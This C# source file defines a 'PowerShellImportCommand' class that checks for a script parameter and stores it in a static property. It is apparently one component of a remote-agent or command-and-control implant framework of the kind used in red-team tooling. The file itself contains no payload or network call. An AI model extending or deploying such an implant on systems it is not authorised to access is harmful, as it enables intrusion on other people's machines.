using Agent.Models;
using Shared;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class PowerShellImportCommand : AgentCommand
    {
        public override CommandId Command => CommandId.PowershellImport;
        public override async Task InnerExecute(AgentTask task, AgentCommandContext context, CancellationToken token)
        {
            if (!task.HasParameter(ParameterId.File))
            {
                context.Error($"Script is mandatory!");
                return;
            }

            Script = task.GetParameter<string>(ParameterId.File);
        }

        public static string Script { get; set; }
    }
}
